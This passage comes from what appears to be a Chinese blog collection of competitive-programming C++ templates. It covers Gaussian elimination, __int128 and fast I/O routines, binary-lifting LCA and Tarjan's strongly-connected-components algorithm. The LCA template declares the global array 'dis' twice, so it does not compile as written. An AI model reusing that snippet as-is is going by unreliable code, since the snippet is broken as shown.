class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//将该位的系数变为1</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> j<span class="token punctuation">)</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>                    B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">-=</span> B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//将其他方程用加减法减去系数值   </span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.2lf\n"</span><span class="token punctuation">,</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//最后输出结果。</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="24-小技巧"><a href="#24-小技巧" class="headerlink" title="24. 小技巧"></a>24. 小技巧</h3><h4 id="24-1-int-128输入输出"><a href="#24-1-int-128输入输出" class="headerlink" title="24.1 __int 128输入输出"></a>24.1 __int 128输入输出</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp">__int128_t <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    __int128_t x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> f <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>ch<span class="token operator">&lt;</span><span class="token char">'0'</span><span class="token operator">||</span>ch<span class="token operator">></span><span class="token char">'9'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ch<span class="token operator">==</span><span class="token char">'-'</span><span class="token punctuation">)</span>f<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        ch<span class="token operator">=</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>ch<span class="token operator">>=</span><span class="token char">'0'</span><span class="token operator">&amp;&amp;</span>ch<span class="token operator">&lt;=</span><span class="token char">'9'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        x<span class="token operator">=</span>x<span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span>ch<span class="token operator">-</span><span class="token char">'0'</span><span class="token punctuation">;</span>ch<span class="token operator">=</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> x<span class="token operator">*</span>f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span>__int128 x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token char">'-'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        x<span class="token operator">=</span><span class="token operator">-</span>x<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">></span><span class="token number">9</span><span class="token punctuation">)</span>        <span class="token function">write</span><span class="token punctuation">(</span>x<span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putchar</span><span class="token punctuation">(</span>x<span class="token operator">%</span><span class="token number">10</span><span class="token operator">+</span><span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="24-2-读入挂"><a href="#24-2-读入挂" class="headerlink" title="24.2 读入挂"></a>24.2 读入挂</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> v <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> f <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">char</span> c <span class="token operator">=</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span> c <span class="token operator">&lt;</span> <span class="token number">48</span> <span class="token operator">||</span> <span class="token number">57</span> <span class="token operator">&lt;</span> c <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">==</span><span class="token char">'-'</span><span class="token punctuation">)</span> f <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">&lt;=</span> c <span class="token operator">&amp;&amp;</span> c <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span> v <span class="token operator">=</span> v<span class="token operator">*</span><span class="token number">10</span><span class="token operator">+</span>c<span class="token operator">-</span><span class="token number">48</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> v<span class="token operator">*</span>f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Out</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//输出外挂  </span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token char">'-'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a <span class="token operator">=</span> <span class="token operator">-</span>a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span>       <span class="token function">Out</span><span class="token punctuation">(</span>a <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">putchar</span><span class="token punctuation">(</span>a <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  </code></pre><h3 id="25-LCA"><a href="#25-LCA" class="headerlink" title="25. LCA"></a>25. LCA</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">5e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7ffffff</span><span class="token punctuation">;</span><span class="token keyword">int</span> N<span class="token punctuation">,</span> M<span class="token punctuation">,</span> S<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> to<span class="token punctuation">,</span> w<span class="token punctuation">,</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> edge<span class="token punctuation">[</span>maxn <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> head<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> dis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> tot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">addedge</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tot<span class="token operator">++</span><span class="token punctuation">;</span>    edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token operator">=</span> z<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>to <span class="token operator">=</span> y<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>    head<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> tot<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> depth<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> fa<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">,</span> lg<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> dis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">prepare</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    lg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    lg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        lg<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> lg<span class="token punctuation">[</span>i <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> now<span class="token punctuation">,</span> <span class="token keyword">int</span> father<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    fa<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> father<span class="token punctuation">,</span> depth<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> depth<span class="token punctuation">[</span>father<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> lg<span class="token punctuation">[</span>depth<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        fa<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> fa<span class="token punctuation">[</span>fa<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> head<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>next<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to <span class="token operator">!=</span> father<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            dis<span class="token punctuation">[</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">]</span> <span class="token operator">=</span> dis<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">+</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>w<span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">,</span> now<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">LCA</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>depth<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">&lt;</span> depth<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token function">swap</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>depth<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">></span> depth<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> fa<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>lg<span class="token punctuation">[</span>depth<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">-</span> depth<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> y<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> lg<span class="token punctuation">[</span>depth<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>k<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fa<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">!=</span> fa<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>            x <span class="token operator">=</span> fa<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> y <span class="token operator">=</span> fa<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> fa<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> N <span class="token operator">>></span> M <span class="token operator">>></span> S<span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> x <span class="token operator">>></span> y<span class="token punctuation">;</span>        <span class="token function">addedge</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">addedge</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">prepare</span><span class="token punctuation">(</span>N <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span>S<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> M<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> x <span class="token operator">>></span> y<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token function">LCA</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out","w",stdout);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">//    cin >> T;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>T<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="26-tarjan"><a href="#26-tarjan" class="headerlink" title="26. tarjan"></a>26. tarjan</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">5e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span> low<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> dfn<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> tot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> head<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> N<span class="token punctuation">,</span> M<span class="token punctuation">;</span><span class="token keyword">int</span> value<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans <span class="token operator">=</span> maxn<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> to<span class="token punctuation">,</span> w<span class="token punctuation">,</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>edge<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">addedge</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">,</span><span class="token keyword">int</span> z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tot<span class="token operator">++</span><span class="token punctuation">;</span>    edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token operator">=</span> z<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>to <span class="token operator">=</span> y<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>    head<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> tot<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>stack<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> st<span class="token punctuation">;</span><span class="token keyword">int</span> nd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">tarjan</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    dfn<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">++</span>nd<span class="token punctuation">;</span>    vis<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    st<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> head<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token punctuation">;</span>i<span class="token operator">=</span>edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>next<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> v <span class="token operator">=</span> edge<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>dfn<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">tarjan</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>            low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>low<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> low<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>vis<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            low<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>low<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> dfn<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>low<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">==</span>dfn<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> now <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            st<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            vis<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>             cnt<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>now <span class="token operator">==</span> x<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cnt<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>cnt<span class="token punctuation">,</span> ans<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> x<span class="token punctuation">;</span>    cin <span class="token operator">>></span> N<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> x<span class="token punctuation">;</span>        <span class="token function">addedge</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> x<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> N<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>dfn<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token function">tarjan</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//freopen("out","w",stdout);</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> T <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token comment">//cin >> T;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>T<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="27-树状数组"><a href="#27-树状数组" class="headerlink" title="27. 树状数组"></a>27. 